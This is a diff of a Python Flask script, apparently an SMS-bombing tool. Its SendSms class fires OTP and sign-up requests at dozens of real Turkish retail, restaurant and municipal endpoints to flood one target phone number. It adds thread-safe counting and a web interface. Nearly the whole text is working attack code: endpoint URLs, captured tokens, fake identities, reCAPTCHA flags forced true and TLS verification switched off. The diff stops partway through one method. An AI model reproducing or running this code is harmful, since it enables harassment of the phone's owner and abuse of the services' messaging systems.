@@ -1,19 +1,19 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
 import requests
 from random import choice, randint
 from string import ascii_lowercase
-import uuid
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import time
+from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 
 # ============================================================
-# ORİJİNAL SendSms SINIFI (CONSOLE'DAN AYNEN ALINDI)
+# ORİJİNAL SendSms SINIFI (AYNEN)
 # ============================================================
 class SendSms:
     adet = 0
+    _lock = threading.Lock()  # thread güvenliği
     
     def __init__(self, phone, mail):
         rakam = []
@@ -32,7 +32,6 @@ class SendSms:
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
 
-    # kahvedunyasi.com
     def KahveDunyasi(self):    
         try:    
             url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
@@ -40,35 +39,35 @@ class SendSms:
             json={"countryCode": "90", "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "Success":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:    
             pass
 
-    # wmf.com.tr
     def Wmf(self):
         try:
             wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
             if wmf.status_code == 202:
-                self.adet += 1   
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # bim
     def Bim(self):
         try:
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
             if bim.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # englishhome.com
     def Englishhome(self):
         try:
             url = "https://www.englishhome.com:443/api/member/sendOtp"
@@ -76,13 +75,13 @@ class SendSms:
             json={"Phone": self.phone, "XID": ""}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isError"] == False:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
           
-    # suiste.com
     def Suiste(self):
         try:
             url = "https://suiste.com:443/api/auth/code"
@@ -90,24 +89,24 @@ class SendSms:
             data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["code"] == "common.success":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
                 
-    # KimGbIster
     def KimGb(self):
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
             
-    # evidea.com
     def Evidea(self):
         try:
             url = "https://www.evidea.com:443/users/register/"
@@ -115,13 +114,13 @@ class SendSms:
             data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)      
             if r.status_code == 202:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # 345dijital.com
     def Ucdortbes(self):
         try:
             url = "https://api.345dijital.com:443/api/users/register"
@@ -133,9 +132,9 @@ class SendSms:
             else:
                 raise
         except:
-            self.adet += 1
+            with self._lock:
+                self.adet += 1
 
-    # tiklagelsin.com
     def TiklaGelsin(self):
         try:
             url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
@@ -143,13 +142,13 @@ class SendSms:
             json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["generateOtp"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # naosstars.com
     def Naosstars(self):
         try:
             url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
@@ -157,13 +156,13 @@ class SendSms:
             json={"telephone": f"+90{self.phone}", "type": "register"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # koton.com
     def Koton(self):
         try:
             url = "https://www.koton.com:443/users/register/"
@@ -171,13 +170,13 @@ class SendSms:
             data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.status_code == 202:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # hayatsu.com.tr
     def Hayatsu(self):
         try:
             url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
@@ -185,13 +184,13 @@ class SendSms:
             data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["is_success"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # hizliecza.com.tr
     def Hizliecza(self):
         try:
             url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
@@ -199,13 +198,13 @@ class SendSms:
             json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # metro-tr.com
     def Metro(self):
         try:
             url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
@@ -213,13 +212,13 @@ class SendSms:
             json={"methodType": "2", "mobilePhoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["status"] == "success":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # file.com.tr
     def File(self):
         try:
             url = "https://api.filemarket.com.tr:443/v1/otp/send"
@@ -227,13 +226,13 @@ class SendSms:
             json={"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["responseType"] == "SUCCESS":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
             
-    # ak-asya.com.tr
     def Akasya(self):
         try:
             url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
@@ -241,13 +240,13 @@ class SendSms:
             json={"phone": self.phone}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == "SMS sended succesfully!":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
         
-    # akbati.com
     def Akbati(self):
         try:
             url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
@@ -255,13 +254,13 @@ class SendSms:
             json={"phone": self.phone}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == "SMS sended succesfully!":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
         
-    # komagene.com.tr
     def Komagene(self):
         try:
             url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
@@ -269,13 +268,13 @@ class SendSms:
             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["Success"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # porty.tech
     def Porty(self):
         try:
             url = "https://panel.porty.tech:443/api.php?"
@@ -283,13 +282,13 @@ class SendSms:
             json={"job": "start_login", "phone": self.phone}
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.json()["status"]== "success":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # vakiftasdelensu.com
     def Tasdelen(self):
         try:
             url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
@@ -297,13 +296,13 @@ class SendSms:
             json={"phone": self.phone}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["result"]== True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # uysalmarket.com.tr
     def Uysal(self):
         try:
             url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
@@ -311,13 +310,13 @@ class SendSms:
             json={"phone_number": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # yapp.com.tr
     def Yapp(self):
         try:
             url = "https://yapp.com.tr:443/api/mobile/v1/register"
@@ -325,13 +324,13 @@ class SendSms:
             json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # yilmazticaret.net
     def YilmazTicaret(self):
         try:
             url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
@@ -339,14 +338,14 @@ class SendSms:
             data = f"--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"token\"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # beefull.com
-    def  Beefull(self):
+    def Beefull(self):
         try:
             url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
             json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
@@ -355,13 +354,13 @@ class SendSms:
             json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
             r = requests.post(url, json=json, timeout=4)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # dominos.com.tr
     def Dominos(self):
         try:
             url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
@@ -369,13 +368,13 @@ class SendSms:
             json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isSuccess"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # baydoner.com
     def Baydoner(self):
         try:
             url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
@@ -383,13 +382,13 @@ class SendSms:
             json={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "DeviceModel": "31", "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Email": self.mail, "GDPRPolicy": False, "Gender": "Kad1n", "GenderId": 2, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "NotificationToken": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 0, "TermsAndConditions": False}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["Control"] == 1:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # pidem.com.tr
     def Pidem(self):
         try:
             url = "https://restashop.azurewebsites.net:443/graphql/"
@@ -397,13 +396,13 @@ class SendSms:
             json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # frink.com.tr
     def Frink(self):
         try:
             url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
@@ -411,13 +410,13 @@ class SendSms:
             json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "SUCCESS":
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # bodrum.bel.tr
     def Bodrum(self):
         try:
             url = "https://gandalf.orwi.app:443/api/user/requestOtp"
@@ -425,13 +424,13 @@ class SendSms:
             json={"gsm": "+90"+self.phone, "source": "orwi"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass     
     
-    # kofteciyusuf.com
     def KofteciYusuf(self):
         try:
             url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
@@ -439,13 +438,13 @@ class SendSms:
             json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["Success"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # littlecaesars.com.tr
     def Little(self):
         try:
             url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
@@ -453,13 +452,13 @@ class SendSms:
             json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200 and r.json()["status"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
     
-    # orwi.app
     def Orwi(self):
         try:
             url = "https://gandalf.orwi.app:443/api/user/requestOtp"
@@ -467,13 +466,13 @@ class SendSms:
             json={"gsm": f"+90{self.phone}", "source": "orwi"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # coffy.com.tr
     def Coffy(self):
         try:
             url = "https://user-api-gw.coffy.com.tr:443/user/signup"
@@ -481,13 +480,13 @@ class SendSms:
             json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # hamidiye.istanbul
     def Hamidiye(self):
         try:
             url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
@@ -495,13 +494,13 @@ class SendSms:
             json={"isGuest": False, "phone": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # ebelediye.fatih.bel.tr
     def Fatih(self):
         try:
             url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
@@ -509,13 +508,13 @@ class SendSms:
             data = f"------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n28.12.1999\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMemati\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBas\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # e-belediye.sancaktepe.bel.tr
     def Sancaktepe(self):
         try:
             url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
@@ -523,13 +522,13 @@ class SendSms:
             data = f"------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n13.01.2000\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # ebelediye.bayrampasa.bel.tr
     def Bayrampasa(self):
         try:
             url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
@@ -537,13 +536,13 @@ class SendSms:
             data = f"------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n07.06.2000\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # money.com.tr
     def Money(self):
         try:
             url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
@@ -551,13 +550,13 @@ class SendSms:
             data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
             r = requests.post(url, headers=headers, data=data, timeout=6)
